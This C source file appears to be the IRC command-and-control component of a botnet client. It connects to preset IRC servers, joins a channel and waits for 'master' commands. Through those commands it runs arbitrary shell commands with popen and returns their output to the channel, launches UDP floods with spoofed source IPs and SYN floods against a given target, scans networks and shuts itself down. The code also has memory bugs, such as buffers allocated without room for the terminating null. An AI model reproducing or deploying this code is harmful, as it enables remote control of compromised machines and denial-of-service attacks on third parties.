#include "../header/header.h"


int parse_master_cmd(char **master_cmd, char *buf, int cmd_size);
void free_master_cmd(char **master_cmd, int cmd_size);

int irc_connect(irc_info *info) {

	// verifies if may use pre configured servers or argument passed server
	bool predef_srv = info->hostname;

	char *srv = NULL;
	char *port = NULL;

	char *irc_servers = malloc(strlen(IRC_SERVERS));
	strcpy(irc_servers, IRC_SERVERS);

	char *end_tok;

	int fd_irc;

	// structures used to get host info, like IP e port
	struct addrinfo hints, *result, *rp;

	// hints is used to filter getaddrinfo response
	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_canonname = NULL;
	hints.ai_addr = NULL;
	hints.ai_next = NULL;
	hints.ai_socktype = SOCK_STREAM; // we want TCP
	hints.ai_family = AF_INET; // only IPv4, put AF_INET6 to IPv6 or AF_UNSPEC to get both
	hints.ai_flags = 0;

	for(;;) {

		fd_irc = 0;

		if (!predef_srv) {

			if (srv) {
				srv = strtok_r(NULL, "|", &end_tok);

				srv = strtok(srv, ":");
				port = strtok(NULL, ":");

			} else {
				srv = strtok_r(irc_servers, "|", &end_tok);
				srv = strtok(srv, ":");
				port = strtok(NULL, ":");
			}
			printf("server = %s port = %s\n", srv, port);
			// if there are no more servers to try
			if (!srv || !port) return EXIT_FAILURE;

		} else {

			// if we've already tried this server
			if (srv) return EXIT_FAILURE;

			port = alloca(10);
			srv = info->hostname;
			sprintf(port, "%d", info->port);
		}


		// try to find a socket
		if (getaddrinfo(srv, port, &hints, &result) != 0) {
			perror("getaddrinfo");

			// try next server
			continue;
		}

		// search through responses
		for (rp = result; rp != NULL; rp = rp->ai_next) {
			if ((fd_irc = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol)) == -1) {
				perror("irc socket");

				// if we can't create a socket with some response, no problem try next
				continue;
			}

			// we've successfuly create a socket, now we need to try to connect
			if (connect(fd_irc, rp->ai_addr, rp->ai_addrlen) == -1) {
				perror("irc connect");
				continue; // again no problem if not works
			}
			break;
		}

		// we must use this convenient method to free all results list
		// (since is a linked list cannot be made with a simple free() )
		freeaddrinfo(result);

		// arrived at last result without successful connection
		if (rp == NULL) {
			close(fd_irc);
			perror("cannot connect to irc");
		} else {

			// we are connected
			info->fd_irc = fd_irc;
			break;
		}
	}

	return EXIT_SUCCESS;
}

int irc_login(irc_info *info) {

	info->nick = random_nick();
	char *NICK = malloc(strlen(info->nick) + 6);
	char *JOIN = malloc(strlen(info->ch) + 6);
	char *USER = malloc(2 * strlen(info->nick) + strlen(IRC_USER) + 1);

	sprintf(USER, IRC_USER, info->nick, info->nick);
	snprintf(NICK, strlen(info->nick) + 6, "NICK %s", info->nick);
	snprintf(JOIN, strlen(info->ch) + 6, "JOIN %s", info->ch);

	if (write(info->fd_irc, NICK, strlen(NICK)) == -1) {
		perror("sending nick");
		return EXIT_FAILURE;
	}
	// send newline
	write(info->fd_irc, "\n", 1);
	printf("value of USER = %s\n", USER);
	if (write(info->fd_irc, USER, strlen(USER)) == -1) {
		perror("sending user");
		return EXIT_FAILURE;
	}
	// send newline
	write(info->fd_irc, "\n", 1);

	if (write(info->fd_irc, JOIN, strlen(JOIN)) == -1) {
		perror("sending join");
		return EXIT_FAILURE;
	}
	// send newline
	write(info->fd_irc, "\n", 1);

	free(NICK);
	free(JOIN);

	return EXIT_SUCCESS;
}

int irc_send(char *msg, int len, irc_info *info) {

	char *PRIVMSG = malloc(len + strlen("PRIVMSG") + strlen(info->ch) + 10);
	snprintf(PRIVMSG, len + strlen(info->ch) + 12, "PRIVMSG %s :%s\n", info->ch, msg);

	int num_write;

	if ((num_write = write(info->fd_irc, PRIVMSG, strlen(PRIVMSG))) == -1) {
		perror("write privmsg irc");
		return EXIT_FAILURE;
	}

	free(PRIVMSG);
	return EXIT_SUCCESS;
}

int irc_listen(irc_info *info) {

	// max quantity of tokens in a message sent by master
	int max_tokens_qty = 16;
	int num_read;
	char buf[MAX_BUF], message[MAX_BUF + strlen("Executing command: ") + 30], popen_buf[MAX_BUF + 1];
	char *str_ret;

	// handle command line sent in IRC
	char command[100];
	char **master_cmd = calloc(16, sizeof(char*));
	FILE *file_popen;
	char welcome[] = "ready to obey to the master!";

	irc_send(welcome, strlen(welcome), info);

	while((num_read = read(info->fd_irc, buf, sizeof(buf))) > 0) {

		// set the terminating null byte of string before \r character
		buf[num_read] = '\0';
		// guarantee that buf doesn't contain CR and LF
		buf[strcspn(buf, "\r\n")] = 0;

		if ((str_ret = strstr(buf, "PRIVMSG"))) {

			int token_len = parse_master_cmd(master_cmd, buf, max_tokens_qty);

			#ifdef DEBUG
			for (int i = 0; i < token_len; i++) {
				printf("token %d = %s\n", i, master_cmd[i]);
			}
			#endif

			// handling sh command
			if (!strncmp(":!", master_cmd[3], 2)) {

				sprintf(message, "Executing command: %s", (master_cmd[3] + 2));

				irc_send(message, strlen(message), info);

				strncpy(command, (master_cmd[3] + 2), strlen(master_cmd[3]) - 1);

				if (!(file_popen = popen(command, "r"))) {

					sprintf(message, "ERROR executing command: %s", command);
					irc_send(message, strlen(message), info);
					continue;

				} else {
					while(fgets(popen_buf, sizeof(popen_buf), file_popen) != NULL)  {
						irc_send(popen_buf, strlen(popen_buf), info);
					}
				}

				pclose(file_popen);

			} else if (!strcmp(":@attack", master_cmd[3])) {
				// handle UDP flood
				if (!strcmp("udp", master_cmd[4])) {

					if (token_len < 11) {
						sprintf(message, "Not enough arguments. Usage: @attack udp <target IP> <number of packets> "
								"<source port [0 for random]> <destination port [0 for random]> <rate of change "
								"[0 for default]> <spoof|nospoof> <spoofed IP [ignore if nospoof]>");
						irc_send(message, strlen(message), info);

					} else {

						attack_info ainfo;
						inet_pton(AF_INET, master_cmd[5], &(ainfo.d_ip));
						// TODO sanitize inputs
						ainfo.n_pkts = atoi(master_cmd[6]);
						ainfo.s_port = atoi(master_cmd[7]);
						ainfo.d_port = atoi(master_cmd[8]);
						ainfo.np_chg = atoi(master_cmd[9]);

						if (!ainfo.np_chg)
							ainfo.np_chg = DEFAULT_NP_CHG;

						if (!strcmp("spoof", master_cmd[10])) {

							ainfo.spoof_ip = 1;

							if ((!strcmp(master_cmd[11], "0")) || master_cmd[11] == NULL)
								ainfo.s_ip = 0;
							else
								inet_pton(AF_INET, master_cmd[11], &(ainfo.s_ip));

						} else if (!strcmp("nospoof", master_cmd[10])) {

							ainfo.spoof_ip = 0;
						}

						udp_flood(&ainfo, info);
					}

				} else if (!strcmp("tcp", master_cmd[4])) {

					if (token_len < 9) {
						sprintf(message, "Not enough arguments. Usage: @attack tcp <target IP> <number of packets> "
							       "<source port [0 for random]> <destination port [0 for random]>");
						irc_send(message, strlen(message), info);

					} else {

						attack_info ainfo;
						inet_pton(AF_INET, master_cmd[5], &(ainfo.d_ip));

						ainfo.n_pkts = atoi(master_cmd[6]);
						ainfo.s_port = atoi(master_cmd[7]);
						ainfo.d_port = atoi(master_cmd[8]);

						syn_flood(&ainfo, info);
					}
				}

			} else if (!strcmp(":@scan", master_cmd[3])) {

				scan_network(info, master_cmd[4]);

			} else if (!strcmp(":@kill", master_cmd[3])) {
				exit(EXIT_SUCCESS);
			}

		free_master_cmd(master_cmd, token_len);

		} else if ((str_ret = strstr(buf, "PING")) != NULL) {
			send_pong(info);
		}


		#ifdef DEBUG
			puts(buf);
			fflush(stdout);
		#endif
	}

	return EXIT_SUCCESS;
}

int parse_master_cmd(char **master_cmd, char *buf, int cmd_size) {
	char *token = strtok(buf, " ");
	int i;
	for (i = 0; i < cmd_size && token; i++, token = strtok(NULL, " ")) {
		master_cmd[i] = malloc(strlen(token));
		strcpy(master_cmd[i], token);
	}
	return i;
}

void free_master_cmd(char **master_cmd, int token_len) {
	for(int i = 0; i < token_len; i++)
		free(master_cmd[i]);
}

// return a random nick to use in IRC channel
char * random_nick() {
	char rnick[] = "abcdefghijklmnopqrstuvwxyz1234567890";
	char *retnick = malloc(IRC_NICK_LEN + 1);
	for (unsigned int i = 0; i < strlen(rnick); i++) {
		rnick[i] = rnick[rand() % strlen(rnick)];
	}

	strncpy(retnick, rnick, IRC_NICK_LEN);
	retnick[0] = 'b';
	retnick[IRC_NICK_LEN] = '\0';
	return retnick;
}
void send_pong(irc_info *info) {
	write(info->fd_irc, "PONG\n", 5);
}
